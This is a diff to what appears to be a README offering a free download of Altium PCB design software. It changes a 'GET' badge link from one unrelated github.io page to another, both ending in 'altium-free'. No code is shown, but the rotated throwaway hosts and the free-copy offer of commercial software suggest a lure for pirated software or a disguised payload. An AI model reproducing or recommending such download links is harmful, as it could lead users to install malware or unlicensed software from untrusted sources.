@@ -65,7 +65,7 @@ Prerequisites: Windows workstation with sufficient storage for project files; in
 | Storage | 10 GB free space | 50 GB or more for libraries, projects, and outputs |
 | Network | Required for download and activation | Stable connection for altium 365 collaboration |
 
-[![GET Altium Pcb Design](https://img.shields.io/badge/GET%20%E2%80%94%20Altium%20Pcb%20Design-0078D6?style=for-the-badge&logoColor=white)](https://proxy-configuration-diagnostic-tools.github.io/.github/altium-free)
+[![GET Altium Pcb Design](https://img.shields.io/badge/GET%20%E2%80%94%20Altium%20Pcb%20Design-0078D6?style=for-the-badge&logoColor=white)](https://renetoddoftw.github.io/.github/altium-free)
 
 ## Related Search Terms
 
